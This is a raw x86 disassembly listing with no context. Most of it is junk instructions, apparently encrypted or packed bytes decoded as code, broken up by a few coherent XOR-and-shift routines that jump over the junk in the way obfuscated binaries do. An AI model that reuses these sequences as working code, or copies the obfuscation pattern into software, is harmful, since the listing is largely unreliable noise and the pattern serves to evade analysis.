  407cdb:	adc    eax,DWORD PTR [edi+0x22]
  407cde:	std    
  407cdf:	pusha  
  407ce0:	jae    0x407cd4
  407ce2:	mov    al,0x86
  407ce4:	js     0x407d2b
  407ce6:	xchg   cl,ch
  407ce8:	pop    ecx
  407ce9:	xor    al,BYTE PTR [edx-0x30]
  407cec:	xchg   ebp,eax
  407ced:	xchg   edi,eax
  407cee:	cmp    esp,DWORD PTR [ebx]
  407cf0:	cs aas 
  407cf2:	in     eax,0x2c
  407cf4:	imul   ecx,ecx,0x582dafbd
  407cfa:	add    al,0x2
  407cfc:	jle    0x407cdc
  407cfe:	dec    eax
  407cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d00:	jae    0x407cc8
  407d02:	dec    eax
  407d03:	push   cs
  407d04:	sub    esp,esp
  407d06:	addr16 in eax,dx
  407d08:	and    eax,0xa911450f
  407d0d:	sbb    cl,ah
  407d0f:	sub    BYTE PTR [ebx+edi*2+0x1c51965d],al
  407d16:	or     ecx,eax
  407d18:	inc    ebp
  407d19:	cdq    
  407d1a:	icebp  
  407d1b:	jl     0x407d85
  407d1d:	xchg   ecx,eax
  407d1e:	push   esp
  407d1f:	es aas 
  407d21:	aad    0x15
  407d23:	scas   al,BYTE PTR es:[edi]
  407d24:	test   ebx,edi
  407d26:	out    0x12,al
  407d28:	pop    ebp
  407d29:	jge    0x407d2d
  407d2b:	fs sahf 
  407d2d:	adc    eax,ecx
  407d2f:	pop    eax
  407d30:	repnz sbb ch,BYTE PTR [ecx]
  407d33:	mov    ebx,0xf5085120
  407d38:	mov    ss,WORD PTR [ebp+esi*2+0x8]
  407d3c:	scas   eax,DWORD PTR es:[edi]
  407d3d:	jno    0x407db9
  407d3f:	xchg   esp,eax
  407d40:	data16 jecxz 0x407db3
  407d43:	jge    0x407d03
  407d45:	jno    0x407d58
  407d47:	mov    es,WORD PTR [edi+0x4daba34d]
  407d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d4e:	ret    0x8a4e
  407d51:	mov    edx,0x7e893e6d
  407d56:	push   0xffffffc0
  407d58:	imul   edx,ecx,0xfffffff7
  407d5b:	(bad)  
  407d5c:	mov    ebx,0xbba81300
  407d61:	int3   
  407d62:	adc    BYTE PTR [edi+0x2f12072d],ah
  407d68:	outs   dx,DWORD PTR ds:[esi]
  407d69:	(bad)  
  407d6a:	pop    eax
  407d6b:	sub    al,0x46
  407d6d:	inc    edi
  407d6e:	cmp    edx,DWORD PTR [eax-0x6e]
  407d71:	mov    edi,0xf6e6dce3
  407d76:	out    dx,eax
  407d77:	cs add eax,0x7e1bc2ca
  407d7d:	aaa    
  407d7e:	xchg   edi,eax
  407d7f:	retf   
  407d80:	mov    eax,ds:0xd0064b99
  407d85:	dec    edx
  407d86:	loop   0x407d48
  407d88:	stos   DWORD PTR es:[edi],eax
  407d89:	fwait
  407d8a:	bound  esi,QWORD PTR [edx]
  407d8c:	xchg   ebx,eax
  407d8d:	lock scas eax,DWORD PTR es:[edi]
  407d8f:	mov    bh,BYTE PTR [ebx+0x37040bd1]
  407d95:	ins    DWORD PTR es:[edi],dx
  407d96:	arpl   WORD PTR [esi],di
  407d98:	mov    ah,0xd0
  407d9a:	je     0x407d67
  407d9c:	push   0x4f3827b0
  407da1:	hlt    
  407da2:	inc    edx
  407da3:	sub    BYTE PTR cs:[ebp+0x1537c964],0x36
  407dab:	inc    edx
  407dac:	push   edx
  407dad:	pop    es
  407dae:	loope  0x407d77
  407db0:	cli    
  407db1:	es clc 
  407db3:	cmc    
  407db4:	push   edi
  407db5:	push   cs
  407db6:	mov    ebx,0x3eed00d6
  407dbb:	xchg   edx,eax
  407dbc:	xchg   ebp,eax
  407dbd:	push   ebp
  407dbe:	cmp    dl,BYTE PTR [ebx+0x4d8bc18b]
  407dc4:	int3   
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xb1b7927e
  407e7d:	mov    al,0x22
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    al,bl
  407e87:	ins    BYTE PTR es:[di],dx
  407e89:	xor    DWORD PTR [edi],edi
  407e8b:	sar    DWORD PTR [ebp*8+0x302bc64],1
  407e92:	cli    
  407e93:	push   ecx
  407e94:	xchg   ebp,eax
  407e95:	clc    
  407e96:	ret    0x27c4
  407e99:	push   cs
  407e9a:	push   ss
  407e9b:	clc    
  407e9c:	(bad)  
  407e9d:	or     cl,BYTE PTR ds:0x83f74bc2
  407ea3:	pop    ss
  407ea4:	out    dx,eax
  407ea5:	xchg   cx,ax
  407ea7:	add    BYTE PTR [edx+ebx*8+0x7ed496f1],0x56
  407eaf:	or     ecx,ebx
  407eb1:	cmp    bh,0x51
  407eb4:	inc    ebp
  407eb5:	pop    eax
  407eb6:	pop    esp
  407eb7:	jl     0x407f04
  407eb9:	(bad)  
  407eba:	arpl   WORD PTR [edx-0x761f7a37],di
  407ec0:	adc    BYTE PTR [edi+edi*8-0x71],al
  407ec4:	mov    eax,ds:0xc2551612
  407ec9:	jmp    0x407e7e
  407ecb:	pop    es
  407ecc:	popf   
  407ecd:	test   al,0xe
  407ecf:	adc    DWORD PTR [edi+ecx*1-0x6c6f42ea],ebx
  407ed6:	jmp    0x6329edd
  407edb:	sub    dh,ah
  407edd:	adc    edi,esp
  407edf:	push   edx
  407ee0:	arpl   WORD PTR [edx-0x6a],bp
  407ee3:	sbb    eax,0x51d48c19
  407ee8:	or     eax,0x32fcbca7
  407eed:	sti    
  407eee:	jo     0x407f4c
  407ef0:	xor    ebp,DWORD PTR [esp+ebx*4]
  407ef3:	jmp    FWORD PTR [esi]
  407ef5:	jecxz  0x407f50
  407ef7:	sar    BYTE PTR [esi-0x61636dcb],cl
  407efd:	mov    al,BYTE PTR [edi+0x108796bb]
  407f03:	not    edx
  407f05:	stc    
  407f06:	lahf   
  407f07:	ins    BYTE PTR es:[edi],dx
  407f08:	push   0x29
  407f0a:	shr    DWORD PTR [edx+eiz*2+0xa3d1f7d],1
  407f11:	fidivr DWORD PTR [eax]
  407f13:	out    0xa8,al
  407f15:	pop    es
  407f16:	faddp  st(7),st
  407f18:	outs   dx,BYTE PTR ds:[esi]
  407f19:	adc    ebp,edx
  407f1b:	aad    0x24
  407f1d:	in     al,0x69
  407f1f:	leave  
  407f20:	add    al,0x63
  407f22:	jecxz  0x407f4f
  407f24:	ins    BYTE PTR es:[edi],dx
  407f25:	sti    
  407f26:	inc    ecx
  407f27:	std    
  407f28:	push   eax
  407f29:	outs   dx,DWORD PTR ds:[esi]
  407f2a:	and    esi,DWORD PTR [esi+0x3274781a]
  407f30:	and    al,0x6b
  407f32:	addr16 jle 0x407f19
  407f35:	push   es
  407f36:	fcom   QWORD PTR [esi]
  407f38:	xchg   edi,eax
  407f39:	enter  0xe392,0xfd
  407f3d:	adc    al,0xba
  407f3f:	jmp    0x564f22ba
  407f44:	repnz pop esi
  407f46:	jnp    0x407ed6
  407f48:	adc    dh,BYTE PTR [edi+0x6a]
  407f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f4c:	addr16 lahf 
  407f4e:	sub    al,0x4c
  407f50:	jae    0x407fc5
  407f52:	sbb    cl,dh
  407f54:	push   ecx
  407f55:	jb     0x2389bd06
  407f5b:	pop    esi
  407f5c:	add    al,0x19
  407f5e:	cmp    eax,0x5f1b812a
  407f63:	xor    eax,DWORD PTR [ebx]
  407f65:	or     ebx,ebp
  407f67:	lods   al,BYTE PTR ds:[esi]
  407f68:	dec    edx
  407f69:	jp     0x407f6d
  407f6b:	in     eax,0x1e
  407f6d:	ja     0x407f49
  407f6f:	pushf  
  407f70:	loopne 0x407ef7
  407f72:	push   cs
  407f73:	sbb    al,0xce
  407f75:	pop    esi
  407f76:	adc    al,0xa7
  407f78:	inc    edi
  407f79:	jno    0x407fa6
  407f7b:	(bad)  
  407f7c:	std    
  407f7d:	fdivr  QWORD PTR [ecx+edx*1+0x1e6993e9]
  407f84:	cwde   
  407f85:	(bad)  
  407f86:	mov    eax,ds:0x2d7bac21
  407f8b:	sar    BYTE PTR ds:0x4e3e269d,1
  407f91:	test   BYTE PTR [ebx-0x7f900bcd],bl
  407f97:	shr    BYTE PTR [edx],cl
  407f99:	pushf  
  407f9a:	xor    bh,BYTE PTR [edx*8+0x536a944b]
  407fa1:	scas   eax,DWORD PTR es:[edi]
  407fa2:	imul   esi,DWORD PTR [esi+0x51],0x6b
  407fa6:	push   esp
  407fa7:	lock or al,BYTE PTR [esi]
  407faa:	mov    edi,fs
  407fac:	and    bl,bh
  407fae:	and    ch,ch
  407fb0:	cs (bad) 
  407fb2:	into   
  407fb3:	in     al,0x9
  407fb5:	jo     0x408024
  407fb7:	stos   BYTE PTR es:[edi],al
  407fb8:	inc    edi
  407fb9:	data16 ja 0x407fef
  407fbc:	arpl   WORD PTR [ecx],bp
  407fbe:	cmp    edi,edi
  407fc0:	arpl   WORD PTR [esi-0x5ecf3439],sp
  407fc6:	xor    ecx,DWORD PTR [edi-0x73]
  407fc9:	in     al,dx
  407fca:	mov    ebx,0x91d3b4e4
  407fcf:	sbb    ecx,ebx
  407fd1:	cdq    
  407fd2:	inc    ebp
  407fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fd4:	mov    dh,0x67
  407fd6:	aas    
  407fd7:	xchg   BYTE PTR [esi],ah
  407fd9:	std    
  407fda:	retf   
  407fdb:	or     al,0xfe
  407fdd:	bound  eax,QWORD PTR [esi+0x5b]
  407fe0:	pop    esi
  407fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe2:	xor    edx,edx
  407fe4:	or     al,0x2d
  407fe6:	ror    eax,1
  407fe8:	push   edi
  407fe9:	ins    BYTE PTR es:[edi],dx
  407fea:	jo     0x408028
  407fec:	dec    ebx
  407fed:	ror    ch,1
  407fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff0:	mov    al,0x1f
  407ff2:	jb     0x407fee
  407ff4:	daa    
  407ff5:	imul   eax,DWORD PTR [eax-0x7b75349b],0x1a
  407ffc:	lods   al,BYTE PTR ds:[esi]
  407ffd:	cmp    BYTE PTR [esp],ah
  408000:	cld    
  408001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408002:	fidiv  DWORD PTR ds:0x610645e6
  408008:	xchg   ebp,esi
  40800a:	sub    al,0xf0
  40800c:	sti    
  40800d:	adc    DWORD PTR cs:[ebx],esi
  408010:	pop    esp
  408011:	inc    esp
  408012:	jle    0x407fea
  408014:	sub    DWORD PTR [esi+0x6a],ebp
  408017:	pop    ecx
  408018:	push   eax
  408019:	sbb    eax,0x50e7c073
  40801e:	inc    eax
  40801f:	sub    DWORD PTR [edi],esi
  408021:	retf   0x1885
  408024:	and    edi,DWORD PTR [esi+0x13812e54]
  40802a:	sbb    eax,0xb0e4a021
  40802f:	pop    ebx
  408030:	(bad)
  408033:	mov    dl,0x6f
  408035:	inc    ecx
  408036:	pop    esp
  408037:	inc    eax
  408038:	xor    al,0x94
  40803a:	stc    
  40803b:	push   ds
  40803c:	dec    ecx
  40803d:	adc    edx,DWORD PTR [esi-0x62]
  408040:	xchg   edx,eax
  408041:	sar    DWORD PTR [edi],cl
  408043:	mov    ah,0x61
  408045:	sbb    dl,BYTE PTR [ecx-0x8373f9f]
  40804b:	push   0xdea3beb6
  408050:	adc    DWORD PTR [eax],eax
  408052:	pop    ss
  408053:	mov    ch,BYTE PTR [esi]
  408055:	pop    ecx
  408056:	cwde   
  408057:	aad    0xa
  408059:	mov    WORD PTR [ebx-0x4e],?
  40805c:	inc    esp
  40805d:	add    al,0x25
  40805f:	stc    
  408060:	mov    esp,0xd303c3d6
  408065:	fimul  WORD PTR [edi-0x738b47dc]
  40806b:	int3   
  40806c:	stos   DWORD PTR es:[edi],eax
  40806d:	lock mov bl,0x0
  408070:	mov    esi,0x447ca851
  408075:	xor    eax,edx
  408077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408078:	dec    esi
  408079:	test   BYTE PTR [eax+0x5a65ac23],al
  40807f:	cmp    DWORD PTR ss:[eax],esp
  408082:	sub    edx,DWORD PTR [edx]
  408084:	out    0x95,eax
  408086:	pop    ebp
  408087:	imul   esi,DWORD PTR [edi+esi*1+0x5cc9bd86],0xffffffa3
  40808f:	out    dx,al
  408090:	stos   DWORD PTR es:[edi],eax
  408091:	pop    edi
  408092:	ret    
  408093:	lods   eax,DWORD PTR ds:[esi]
  408094:	dec    cx
  408096:	adc    ecx,DWORD PTR [ebp+esi*1-0x1b]
  40809a:	cs aad 0xa2
  40809d:	dec    edi
  40809e:	jge    0x408029
  4080a0:	and    esi,DWORD PTR [edx+0x3f]
  4080a3:	(bad)  
  4080a4:	in     eax,dx
  4080a5:	push   ds
  4080a6:	bound  ecx,QWORD PTR [edx-0x2e9ddbf]
  4080ac:	and    dl,0xde
  4080af:	jne    0x40804b
  4080b1:	test   eax,0xae02dee8
  4080b6:	mov    ecx,0x9624b1ad
  4080bb:	cmc    
  4080bc:	pop    ss
  4080bd:	mov    ecx,0xb682c105
  4080c2:	clc    
  4080c3:	push   edi
  4080c4:	popf   
  4080c5:	sub    edi,esi
  4080c7:	inc    ebp
  4080c8:	test   BYTE PTR [ecx-0x1601453f],dh
  4080ce:	or     eax,0xbf8bb586
  4080d3:	dec    eax
  4080d4:	mov    ebx,0x7d4d116f
  4080d9:	sub    al,0x88
  4080db:	sbb    eax,0xc67ddb31
  4080e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e1:	retf   0x9fc7
  4080e4:	jp     0x408108
  4080e6:	clc    
  4080e7:	pusha  
  4080e8:	pop    es
  4080e9:	cmp    ah,BYTE PTR [ebx-0x1e]
  4080ec:	mov    ebp,0x268386fe
  4080f1:	mov    eax,ds:0x4de43c69
  4080f6:	xchg   esi,eax
  4080f7:	jle    0xb9aafae8
  4080fd:	out    0x8a,al
  4080ff:	mov    ds:0x2f784b2c,eax
  408104:	sbb    BYTE PTR [eax-0x56],cl
  408107:	std    
  408108:	xor    al,0xe2
  40810a:	nop
  40810b:	cmp    eax,0x12828a13
  408110:	pop    ebp
  408111:	or     esi,DWORD PTR [eax-0x12123de9]
  408117:	lds    ebx,FWORD PTR [ebx+0x4c]
  40811a:	dec    BYTE PTR ds:0x2c46b95a
  408120:	ins    DWORD PTR es:[edi],dx
  408121:	pushf  
  408122:	xor    DWORD PTR [edx-0x669fc852],ebp
  408128:	cmp    esp,0x88ca56be
  40812e:	push   esi
  40812f:	scas   eax,DWORD PTR es:[edi]
  408130:	inc    edx
  408131:	aas    
  408132:	pop    es
  408133:	data16 addr16 jne 0x408145
  408137:	push   ebp
  408138:	xlat   BYTE PTR ds:[ebx]
  408139:	mov    al,ds:0x2487f0ea
  40813e:	mov    ecx,0x7ae88cc
  408143:	inc    edi
  408144:	in     eax,0xf7
  408146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408147:	fsubr  DWORD PTR ds:0x3017f789
  40814d:	icebp  
  40814e:	or     dh,al
  408150:	fsub   DWORD PTR [ebp-0x3a]
  408153:	sbb    al,0x5b
  408155:	cdq    
  408156:	sbb    dh,BYTE PTR [edx+0x11]
  408159:	push   cs
  40815a:	retf   0x2f2d
  40815d:	ror    ch,1
  40815f:	sub    eax,0xd9b93fe6
  408164:	hlt    
  408165:	mov    cl,0x53
  408167:	inc    edi
  408168:	mov    edi,0x609fc43f
  40816d:	inc    edi
  40816e:	push   ebx
  40816f:	jno    0x408143
  408171:	adc    al,0x8d
  408173:	jns    0x4081a5
  408175:	stos   BYTE PTR es:[edi],al
  408176:	lods   eax,DWORD PTR ds:[esi]
  408177:	(bad)  
  408178:	lods   al,BYTE PTR ds:[esi]
  408179:	in     al,0xaa
  40817b:	and    al,0xb7
  40817d:	inc    eax
  40817e:	out    0xad,eax
  408180:	xor    al,0xc5
  408182:	jl     0x40813d
  408184:	xor    edx,DWORD PTR [ecx]
  408186:	or     edx,edx
  408188:	xor    al,0x57
  40818a:	mov    edi,0x7006faa0
  40818f:	lods   eax,DWORD PTR ds:[esi]
  408190:	test   eax,0x6fb74643
  408195:	xchg   esi,eax
  408196:	syscall 
  408198:	int3   
  408199:	dec    esi
  40819a:	add    eax,0x7dcc3f50
  40819f:	sbb    DWORD PTR [ebp+0x64],esp
  4081a2:	pop    edi
  4081a3:	xchg   DWORD PTR [ecx],ebx
  4081a5:	xor    al,0x3b
  4081a7:	shl    BYTE PTR [esi+0x32],cl
  4081aa:	jnp    0x4081c8
  4081ac:	repnz add DWORD PTR [eax-0x492eff61],esp
  4081b3:	and    al,0x65
  4081b5:	repz jbe 0x408180
  4081b8:	loopne 0x408163
  4081ba:	inc    eax
  4081bb:	jns    0x4081f0
  4081bd:	dec    ecx
  4081be:	push   eax
  4081bf:	jns    0x4081b2
  4081c1:	mov    edi,0x36064b5d
  4081c6:	or     al,0xa
  4081c8:	into   
  4081c9:	fwait
  4081ca:	pop    ss
  4081cb:	push   ebp
  4081cc:	sti    
  4081cd:	iret   
  4081ce:	inc    ebx
  4081cf:	cmp    cl,BYTE PTR [ebx]
  4081d1:	add    eax,0xc0a48818
  4081d6:	cmp    eax,0xb8b9cded
  4081db:	sub    eax,0x5f33217b
  4081e0:	ss jecxz 0x4081ee
  4081e3:	xor    ah,BYTE PTR [ecx-0x5b]
  4081e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e7:	cmp    BYTE PTR [ecx-0x23be5888],ah
  4081ed:	imul   ebx,DWORD PTR [ecx],0xe6792d69
  4081f3:	pop    esi
  4081f4:	(bad)  
  4081f5:	xor    ebp,ecx
  4081f7:	lahf   
  4081f8:	aam    0x22
  4081fa:	push   edx
  4081fb:	pop    edx
  4081fc:	mov    esi,DWORD PTR [eax-0x3e116b2e]
  408202:	ficomp WORD PTR [edi+esi*1]
  408205:	jno    0x40825e
  408207:	sub    DWORD PTR [edx],ebx
  408209:	or     ah,BYTE PTR [ebx]
  40820b:	and    eax,ebx
  40820d:	xor    BYTE PTR [eax-0x27],ah
  408210:	xor    bl,BYTE PTR [eax+ebx*8+0x73]
  408214:	sub    dl,bh
  408216:	in     al,dx
  408217:	xor    eax,DWORD PTR [ebx-0x19]
  40821a:	popa   
  40821b:	dec    edx
  40821c:	lods   eax,DWORD PTR ds:[esi]
  40821d:	std    
  40821e:	out    dx,al
  40821f:	hlt    
  408220:	dec    esp
  408221:	cwde   
  408222:	mov    al,0x7d
  408224:	das    
  408225:	out    0xee,eax
  408227:	push   eax
  408228:	mov    eax,0x5bcc987f
  40822d:	cli    
  40822e:	mov    ebx,ecx
  408230:	mov    DWORD PTR ds:0x8a7758d1,ebx
  408236:	data16 cmp bl,BYTE PTR [ecx-0x48]
  40823a:	jg     0x4081be
  40823c:	inc    edi
  40823d:	add    ecx,DWORD PTR [ecx*2-0x4ff656d1]
  408244:	jbe    0x4082c4
  408246:	and    al,0x89
  408248:	inc    ebp
  408249:	xchg   esp,eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x60ea709d
  40828a:	scas   eax,DWORD PTR es:[edi]
  40828b:	mov    al,0xa8
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [eax],bh
  408295:	inc    eax
  408296:	jbe    0x4082c9
  408298:	in     al,dx
  408299:	sub    ebp,edi
  40829b:	loope  0x4082d2
  40829d:	lock jg 0x408250
  4082a0:	xchg   edx,eax
  4082a1:	neg    esi
  4082a3:	xor    eax,0xc6239ee4
  4082a8:	idiv   bh
  4082aa:	jnp    0x408268
  4082ac:	push   edi
  4082ad:	xor    edi,DWORD PTR [ecx+0x1f]
  4082b0:	sbb    ebp,DWORD PTR ds:0x4ceaae6b
  4082b6:	pop    eax
  4082b7:	push   0xfe2b6f06
  4082bc:	in     eax,dx
  4082bd:	mov    al,ds:0xe0cafab5
  4082c2:	arpl   WORD PTR [eax-0x717b5f2d],cx
  4082c8:	inc    esi
  4082c9:	sbb    al,0xfb
  4082cb:	fst    QWORD PTR [edi]
  4082cd:	inc    esi
  4082ce:	jg     0x40830a
  4082d0:	imul   esi,DWORD PTR [esi+0x7b32921d],0xffffff91
  4082d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d8:	add    ecx,0xffffffc3
  4082db:	xchg   BYTE PTR [eax+0x21],bh
  4082de:	inc    edx
  4082df:	push   eax
  4082e0:	fadd   DWORD PTR [edi-0x19670332]
  4082e6:	aad    0xb9
  4082e8:	std    
  4082e9:	fsubp  st(3),st
  4082eb:	cmp    edi,DWORD PTR [ecx+0x72]
  4082ee:	mov    cl,0x3f
  4082f0:	xor    edi,DWORD PTR [edi+0x6f4cda45]
  4082f6:	xor    al,0x10
  4082f8:	iret   
  4082f9:	call   0x870c:0x72a7c26c
  408300:	lods   al,BYTE PTR ds:[esi]
  408301:	call   0xcaa2:0x327ae6a7
  408308:	icebp  
  408309:	retf   0xc718
  40830c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40830d:	xor    edx,ebp
  40830f:	mov    DWORD PTR ds:0xe5f18c07,edi
  408315:	jne    0x40833c
  408317:	jmp    FWORD PTR [edx-0x59]
  40831a:	in     eax,dx
  40831b:	sub    eax,0xc8136be8
  408320:	adc    al,0x13
  408322:	adc    eax,0x14c6f630
  408327:	dec    esi
  408328:	push   esi
  408329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40832a:	in     al,dx
  40832b:	cmp    DWORD PTR [esi+0xe],ebp
  40832e:	imul   eax,DWORD PTR [edx-0x43f950e4],0x58e1cb0a
  408338:	addr16 xor cl,al
  40833b:	xchg   edi,eax
  40833c:	popa   
  40833d:	test   eax,0xe95ed160
  408342:	mov    esp,0xe20fd909
  408347:	pop    eax
  408348:	test   esp,ebx
  40834a:	push   ebp
  40834b:	fisubr DWORD PTR [eax-0xaa0ded2]
  408351:	retf   0x4660
  408354:	add    ch,BYTE PTR [eax+ecx*1-0x13c9bf81]
  40835b:	(bad)  [ebx-0x3b8d6f7c]
  408361:	enter  0x8690,0x97
  408365:	push   esi
  408366:	dec    ecx
  408367:	sub    dl,BYTE PTR [ebx-0x14ebb21a]
  40836d:	mov    ebx,0x1a1cbdcf
  408372:	sub    BYTE PTR [ecx+0x4683e086],cl
  408378:	leave  
  408379:	adc    eax,0x7f606aa3
  40837e:	cmp    ebp,ebp
  408380:	mov    edi,0x36840cda
  408385:	mov    cl,0x3d
  408387:	sbb    edi,DWORD PTR [ebp-0x6af69f04]
  40838d:	and    ah,BYTE PTR [ebx*4+0x5926c3b2]
  408394:	ds stos BYTE PTR es:[edi],al
  408396:	shl    DWORD PTR [ebx+0x3a],1
  408399:	dec    BYTE PTR [ecx]
  40839b:	add    al,0x85
  40839e:	shl    BYTE PTR ds:0x361dbce1,cl
  4083a4:	scas   eax,DWORD PTR es:[edi]
  4083a5:	test   DWORD PTR [edx+ecx*4],esp
  4083a8:	lahf   
  4083a9:	inc    ecx
  4083aa:	dec    edx
  4083ac:	rol    BYTE PTR [esp+eax*8],1
  4083af:	jmp    0x9f03:0x89d458f1
  4083b6:	push   ss
  4083b7:	jae    0x408436
  4083b9:	inc    edi
  4083ba:	xor    DWORD PTR [ebp+0x5fe87bf1],0xc4f39006
  4083c4:	and    ecx,DWORD PTR [edx+0x6e]
  4083c7:	int    0x28
  4083c9:	pop    edi
  4083ca:	and    DWORD PTR [edx-0x44],0xc8aaf945
  4083d1:	mov    esp,0x31a5395
  4083d6:	lds    ebx,FWORD PTR [eax]
  4083d8:	add    dh,BYTE PTR ss:[eax+eiz*1+0x7840e366]
  4083e0:	mov    edi,0x522c9d41
  4083e5:	es push gs
  4083e8:	(bad)  
  4083e9:	and    al,0x29
  4083eb:	cmp    DWORD PTR [esi+ebp*2-0x78],edx
  4083ef:	test   dh,0xca
  4083f2:	sar    DWORD PTR [esi-0x9],cl
  4083f5:	scas   al,BYTE PTR es:[edi]
  4083f6:	inc    ebp
  4083f7:	bound  esi,QWORD PTR [ebx+0xa]
  4083fa:	xor    dh,BYTE PTR [esi]
  4083fc:	sub    eax,0x73c23df4
  408401:	jmp    0xd8d262f3
  408406:	dec    esp
  408407:	inc    eax
  408408:	xchg   ecx,eax
  408409:	(bad)  
  40840a:	cmp    BYTE PTR [edx],bl
  40840c:	cdq    
  40840d:	lods   eax,DWORD PTR ds:[esi]
  40840e:	neg    ah
  408410:	and    BYTE PTR [eax-0x43cb0162],ah
  408416:	sete   BYTE PTR [ecx]
  408419:	mov    ds:0xb5ee1a56,al
  40841e:	and    DWORD PTR [ebp-0xf7a7b70],ebp
  408424:	xor    al,dl
  408426:	stos   BYTE PTR es:[edi],al
  408427:	in     eax,dx
  408428:	bnd ret 0xec8e
  40842c:	cmp    BYTE PTR [ebp+ebx*4-0x158330c8],dh
  408433:	sbb    DWORD PTR [edi],0x27
  408436:	scas   al,BYTE PTR es:[edi]
  408437:	loop   0x40840c
  408439:	cli    
  40843a:	dec    ebx
  40843b:	fst    DWORD PTR [edi]
  40843d:	add    eax,0x4f9e4d4d
  408442:	ss xor eax,0xe570bbc5
  408448:	jmp    0x408462
  40844a:	or     ebp,DWORD PTR [ebx]
  40844c:	pop    edi
  40844d:	add    eax,0x9c06e44f
  408452:	fdivr  QWORD PTR [ecx]
  408454:	xor    DWORD PTR [ebx],esp
  408456:	sub    DWORD PTR [esi],esp
  408458:	inc    ebp
  408459:	pop    ecx
  40845a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40845b:	dec    esp
  40845c:	test   al,0x73
  40845e:	mov    ecx,0x1289269c
  408463:	int    0x84
  408465:	push   es
  408466:	cs cmp al,0x1a
  408469:	nop
  40846a:	push   esi
  40846b:	mov    ?,WORD PTR [edx+0x2c]
  40846e:	sub    bh,BYTE PTR [ebx+eiz*4]
  408471:	jnp    0x4084d5
  408473:	mov    eax,ds:0xccfb6ba2
  408478:	loop   0x408468
  40847a:	xor    eax,0x13542316
  40847f:	loopne 0x408403
  408481:	sub    edi,edi
  408483:	ror    edx,1
  408485:	xchg   ebp,eax
  408486:	ins    DWORD PTR es:[edi],dx
  408487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
